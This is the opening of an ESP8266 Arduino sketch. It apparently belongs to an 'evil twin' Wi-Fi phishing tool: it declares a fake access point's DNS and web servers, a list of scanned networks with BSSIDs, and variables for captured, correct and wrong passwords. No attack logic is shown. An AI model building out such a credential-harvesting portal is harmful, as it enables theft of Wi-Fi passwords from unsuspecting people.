#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPUpdateServer.h>

ESP8266HTTPUpdateServer httpUpdater;

extern "C" {
#include "user_interface.h"
}


typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

String _SSIDPassword = "";
String _savedSSIDPassword = "";
String _wrongSSIDPassword = "";
String _savedwrongSSIDPassword = "";

const char* serverIndex = "<form method='POST' action='/updates' enctype='multipart/form-data'><input type='file' name='update'><input type='submit' value='Update'></form>";

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

String _correct = "";
String _tryPassword = "";
